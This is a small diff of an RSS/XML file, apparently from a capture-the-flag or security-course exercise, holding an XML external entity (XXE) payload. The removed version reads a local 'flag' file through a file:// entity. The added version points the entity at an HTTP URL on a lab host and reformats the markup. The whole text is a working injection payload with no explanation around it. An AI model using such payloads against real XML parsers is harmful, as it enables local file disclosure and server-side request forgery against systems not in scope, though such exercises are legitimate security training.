@@ -1,5 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0">
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]>
-<task><name>&xxe;</name></task>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://feedifier1.quoccabank.com/flag">]>
+        <task>
+            <name>&xxe;</name>
+        </task>
 </rss>
